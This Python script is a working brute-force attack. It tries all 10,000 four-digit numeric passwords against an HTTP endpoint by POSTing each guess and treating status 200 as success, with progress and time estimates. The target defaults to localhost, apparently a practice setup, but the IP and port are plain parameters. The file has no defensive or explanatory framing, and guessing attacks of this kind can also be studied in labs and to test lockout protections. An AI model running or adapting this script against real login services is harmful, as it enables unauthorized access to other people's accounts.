import requests
import logging
from itertools import product
from string import digits
import time

logging.basicConfig(level=logging.INFO)

def try_password(password, server_ip="127.0.0.1", server_port=8000):
    url = f"http://{server_ip}:{server_port}"
    payload = {"password": password}

    try:
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            logging.info(f"Correct password found: {password}")
            print(f"Correct password found: {password}")
            return True
        else:
            logging.debug(f"Incorrect password: {password}")
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Error trying password {password}: {e}")
        return False

def brute_force_password(server_ip="127.0.0.1", server_port=8000):
    total_combinations = 10000
    start_time = time.time()

    for i, password in enumerate(product(digits, repeat=4), 1):
        password = ''.join(password)
        logging.info(f"Trying password {password} ({i}/{total_combinations})")
        
        if try_password(password, server_ip, server_port):
            end_time = time.time()
            logging.info(f"Password found in {end_time - start_time:.2f} seconds")
            return

        if i % 100 == 0:  # Print progress every 100 attempts
            progress = i / total_combinations * 100
            elapsed_time = time.time() - start_time
            estimated_total_time = elapsed_time * (total_combinations / i)
            remaining_time = estimated_total_time - elapsed_time
            print(f"Progress: {progress:.2f}% | Elapsed: {elapsed_time:.2f}s | Remaining: {remaining_time:.2f}s")

    logging.info("All possible passwords tried without success")
    print("Password not found")

if __name__ == "__main__":
    brute_force_password()